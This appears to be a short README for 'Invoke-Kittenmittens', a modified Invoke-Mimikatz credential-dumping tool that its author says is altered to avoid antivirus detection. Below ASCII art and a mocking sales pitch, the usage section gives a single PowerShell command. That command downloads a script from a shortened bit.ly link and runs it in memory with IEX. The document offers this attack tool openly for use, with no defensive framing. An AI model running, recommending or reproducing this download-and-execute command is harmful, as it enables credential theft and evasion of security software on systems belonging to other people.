# Invoke-Kittenmittens
Modified "Invoke-Mimikatz" to avoid AV detection

```
                                     |-\
    ___  .  ,     __    _    .       \  \
     |   | /     |  \  / \  /|        |  |
     |   |/      |__/  \_    |        |  \
     |   |\      |       \   |        |  |
    _|_  | \  .  |     \_/  _|_       |  |
                                      |  |
      ___,                            /  /
 ---``    \_     ________---______   |  /
 \           ```                ```-/  /
  }                                    \
  {                                     \
    \ |                                 |
      |                                 |
      |                                 |
      |         _ ------ - ,           /
      /       /  \    |      -        /
     |      /     l   |       ` - _    \
     L__  /        \  |           \\__,L
    /   7           l`T            //  /
 ~``  /             | |          //`  /
{___,~             {__/          \\__/
```

Is your Mimikatz making too much noise all the time? Is your Mimikatz constantly stomping around and triggering AV? Think there's no answer? You're so stupid! There is! Invoke-Kittenmittens.

# Usage

Run Invoke-Kittenmittens in-memory via a single, condensed CMD command:
```
powershell "IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/2mgBLOs'); Invoke-Kittenmittens"
```
